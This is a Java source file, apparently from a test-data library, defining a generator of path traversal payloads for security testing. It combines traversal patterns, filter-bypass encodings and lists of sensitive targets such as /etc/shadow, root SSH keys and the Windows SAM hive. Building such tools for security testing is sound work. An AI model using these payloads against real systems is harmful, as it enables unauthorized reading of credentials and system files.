package com.dataforge.generators.internal;

import com.dataforge.core.DataForgeContext;
import com.dataforge.generators.spi.DataGenerator;
import com.dataforge.model.FieldConfig;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.List;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 路径穿越生成器
 *
 * <p>生成各种路径穿越攻击payload，用于文件包含漏洞测试、 目录遍历测试等安全测试场景。
 *
 * <p>支持的参数：
 *
 * <ul>
 *   <li>os_type: 操作系统类型 (LINUX|WINDOWS|MIXED) 默认: LINUX
 *   <li>target_file: 目标文件 (PASSWD|HOSTS|CONFIG|CUSTOM) 默认: PASSWD
 *   <li>depth: 穿越深度 默认: 3
 *   <li>encoding: 编码方式 (NONE|URL|DOUBLE_URL|UNICODE) 默认: NONE
 *   <li>bypass_filter: 是否绕过过滤器 默认: false
 * </ul>
 *
 * @author DataForge Team
 * @since 1.0.0
 */
public class PathTraversalGenerator extends BaseGenerator
    implements DataGenerator<String, FieldConfig> {

  private static final Logger logger = LoggerFactory.getLogger(PathTraversalGenerator.class);
  private static final SecureRandom random = new SecureRandom();

  // Linux目标文件
  private static final List<String> LINUX_TARGETS =
      Arrays.asList(
          "/etc/passwd",
          "/etc/shadow",
          "/etc/hosts",
          "/etc/fstab",
          "/proc/version",
          "/proc/cmdline",
          "/var/log/auth.log",
          "/home/user/.bash_history",
          "/root/.ssh/id_rsa");

  // Windows目标文件
  private static final List<String> WINDOWS_TARGETS =
      Arrays.asList(
          "C:\\Windows\\System32\\drivers\\etc\\hosts",
          "C:\\Windows\\System32\\config\\SAM",
          "C:\\Windows\\win.ini",
          "C:\\Windows\\System32\\config\\SYSTEM",
          "C:\\Users\\Administrator\\Desktop\\desktop.ini");

  // 路径穿越模式
  private static final String[] TRAVERSAL_PATTERNS = {
    "../", "..\\", "....//", "....\\\\",
    "%2e%2e%2f", "%2e%2e%5c", "..%2f", "..%5c"
  };

  // 过滤器绕过技巧
  private static final String[] BYPASS_TECHNIQUES = {
    "....//", "....\\\\", "..%252f", "..%255c",
    "%2e%2e/", "%2e%2e\\", "..%c0%af", "..%c1%9c"
  };

  @Override
  public String getType() {
    return "path_traversal";
  }

  @Override
  public Class<FieldConfig> getConfigClass() {
    return FieldConfig.class;
  }

  @Override
  public String generate(FieldConfig config, DataForgeContext context) {
    try {
      String osType = getStringParam(config, "os_type", "LINUX").toUpperCase();
      String targetFile = getStringParam(config, "target_file", "PASSWD").toUpperCase();
      int depth = getIntParam(config, "depth", 3);
      String encoding = getStringParam(config, "encoding", "NONE").toUpperCase();
      boolean bypassFilter = getBooleanParam(config, "bypass_filter", false);

      String payload = generatePayload(osType, targetFile, depth, bypassFilter);
      payload = applyEncoding(payload, encoding);

      // 存储到上下文
      context.put("path_traversal_os", osType);
      context.put("path_traversal_target", targetFile);
      context.put("path_traversal_payload", payload);

      return payload;

    } catch (Exception e) {
      logger.error("Failed to generate path traversal payload", e);
      return "../../../etc/passwd";
    }
  }

  private String generatePayload(
      String osType, String targetFile, int depth, boolean bypassFilter) {
    String traversalPattern = selectTraversalPattern(osType, bypassFilter);
    String target = selectTargetFile(osType, targetFile);

    StringBuilder payload = new StringBuilder();

    // 添加路径穿越
    for (int i = 0; i < depth; i++) {
      payload.append(traversalPattern);
    }

    // 添加目标文件
    payload.append(target);

    return payload.toString();
  }

  private String selectTraversalPattern(String osType, boolean bypassFilter) {
    if (bypassFilter) {
      return BYPASS_TECHNIQUES[random.nextInt(BYPASS_TECHNIQUES.length)];
    }

    String[] patterns;
    switch (osType) {
      case "WINDOWS":
        patterns = new String[] {"..\\", "....\\\\", "%2e%2e%5c"};
        break;
      case "MIXED":
        patterns = TRAVERSAL_PATTERNS;
        break;
      case "LINUX":
      default:
        patterns = new String[] {"../", "....//", "%2e%2e%2f"};
        break;
    }

    return patterns[random.nextInt(patterns.length)];
  }

  private String selectTargetFile(String osType, String targetFile) {
    List<String> targets;

    switch (osType) {
      case "WINDOWS":
        targets = WINDOWS_TARGETS;
        break;
      case "MIXED":
        targets = random.nextBoolean() ? LINUX_TARGETS : WINDOWS_TARGETS;
        break;
      case "LINUX":
      default:
        targets = LINUX_TARGETS;
        break;
    }

    if ("CUSTOM".equals(targetFile)) {
      return targets.get(random.nextInt(targets.size()));
    }

    // 根据目标文件类型选择
    switch (targetFile) {
      case "PASSWD":
        return osType.equals("WINDOWS") ? "C:\\Windows\\System32\\config\\SAM" : "/etc/passwd";
      case "HOSTS":
        return osType.equals("WINDOWS")
            ? "C:\\Windows\\System32\\drivers\\etc\\hosts"
            : "/etc/hosts";
      case "CONFIG":
        return osType.equals("WINDOWS") ? "C:\\Windows\\win.ini" : "/etc/fstab";
      default:
        return targets.get(random.nextInt(targets.size()));
    }
  }

  private String applyEncoding(String payload, String encoding) {
    switch (encoding) {
      case "URL":
        return urlEncode(payload);
      case "DOUBLE_URL":
        return urlEncode(urlEncode(payload));
      case "UNICODE":
        return unicodeEncode(payload);
      case "NONE":
      default:
        return payload;
    }
  }

  private String urlEncode(String payload) {
    return payload
        .replace("/", "%2f")
        .replace("\\", "%5c")
        .replace(".", "%2e")
        .replace(":", "%3a")
        .replace(" ", "%20");
  }

  private String unicodeEncode(String payload) {
    StringBuilder unicode = new StringBuilder();
    for (char c : payload.toCharArray()) {
      if (c == '/' || c == '\\' || c == '.') {
        unicode.append("\\u").append(String.format("%04x", (int) c));
      } else {
        unicode.append(c);
      }
    }
    return unicode.toString();
  }
}
